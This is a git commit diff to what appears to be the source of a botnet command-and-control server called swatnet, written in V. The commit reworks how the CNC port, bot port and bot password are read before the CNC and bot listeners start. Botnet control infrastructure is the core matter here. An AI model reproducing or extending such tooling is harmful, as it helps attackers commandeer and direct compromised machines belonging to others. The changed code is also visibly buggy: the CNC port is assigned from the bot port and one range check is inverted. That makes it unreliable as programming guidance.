a0ecbe7d1593c519d1bd48e9f469754f937e8674
Erupt <101347500+Eruptsy@users.noreply.github.com>
2022-06-17 14:53:50 -0400

    Fix CNC Info Inputs

--- swatnet.v
+++ swatnet.v
@@ -26,15 +26,25 @@ fn main() {
 	} else {
 		cnc_port := os.input("CNC Port (1-65500): ")
 		bot_port := os.input("Bot Port (1-65500): ")
-		if bot_port.int() == 0 || bot_port.int() > 65500 { 
-			println("[x] Error, Invalid port provided. Bot system did not start up....!")
-		} else {
+		bot_pw := os.input("Bot Password: ")
+		if bot_port.int() > 0 && bot_port.int() < 65500 { 
 			s.bot_port = bot_port.int()
 		}
 
-		if cnc_port.int() == 0 || cnc_port.int() > 65500 {
-			println("[x] Error, Invalid port provided. CNC starting on the default port: ${s.port}....")
+		if cnc_port.int() > 0 && cnc_port.int() < 65500 { 
+			s.port = bot_port.int()
 		}
+
+		if bot_pw != "" {
+			s.bot_pw = bot_pw
+		}
+	}
+	if s.bot_port.int() == 0 || s.bot_port < 65500 {
+		println("[ x ] Error, No bot port provided. Bot system did not start....")
+	}
+
+	if s.port.int() == 0 || s.port.int() > 65500 {
+		println("[x] Error, Invalid port provided. CNC starting on the default port: ${s.port}....")
 	}
 	mut server := go cnc.start(mut &s)
 	go cnc.start_bot(mut &s.bot, s.bot_port.str(), s.bot_pw)
